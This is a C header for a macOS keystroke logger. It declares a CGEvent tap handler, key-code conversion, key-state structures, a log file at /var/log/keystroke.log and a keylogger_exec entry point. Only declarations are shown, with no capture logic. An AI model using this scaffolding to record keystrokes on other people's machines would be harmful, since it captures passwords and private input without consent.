#pragma once
/******************************************************/
#define MY_LOG_LEVEL    LOG_TRACE
/******************************************************/
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
/******************************************************/
#include "fsio.h"
#include "parson/parson.h"
#include "stringbuffer.h"
#include "stringfn.h"
#include "submodules/meson_deps/submodules/timestamp/timestamp.h"
/******************************************************/
FILE *logfile = NULL;
unsigned long       last_ts;
struct StringBuffer *sb;
/******************************************************/
const char          *logfileLocation = "/var/log/keystroke.log";
CGEventRef          event_handler(CGEventTapProxy, CGEventType, CGEventRef, void *);
const char *convertKeyCode(int);

/******************************************************/
typedef struct KeyState {
  unsigned long ts;
  char          *name;
  int           code;
  struct list_t *downkeys;
} KeyState;
struct KeyState *keystate;
typedef struct DownKey {
  int           keycode;
  unsigned long ts;
} DownKey;
struct DownKeys *downkey;

int keylogger_exec();
